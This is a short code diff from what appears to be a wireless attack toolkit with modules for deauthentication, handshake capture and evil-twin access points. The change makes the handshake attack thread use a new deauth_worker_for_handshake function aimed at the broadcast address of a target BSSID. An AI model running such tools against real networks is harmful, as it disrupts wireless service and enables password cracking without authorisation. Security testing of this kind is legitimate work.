@@ -13,7 +13,7 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
 
 from web.shared import config, logger, log_message
 from utils.network_utils import set_monitor_mode, set_managed_mode
-from attacks.deauth_attack import deauth_worker
+from attacks.deauth_attack import deauth_worker , deauth_worker_for_handshake
 from attacks.capture_attack import capture_worker
 from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network
 from web.socket_io import socketio
@@ -135,7 +135,7 @@ def launch_handshake_attack(network, attack_config):
     
     # Start deauth thread
     deauth_thread = threading.Thread(
-        target=deauth_worker,
+        target=deauth_worker_for_handshake,
         args=(bssid, "FF:FF:FF:FF:FF:FF", config['interface'], 10, 0.1, attack_state['stop_event']),
         daemon=True
     )
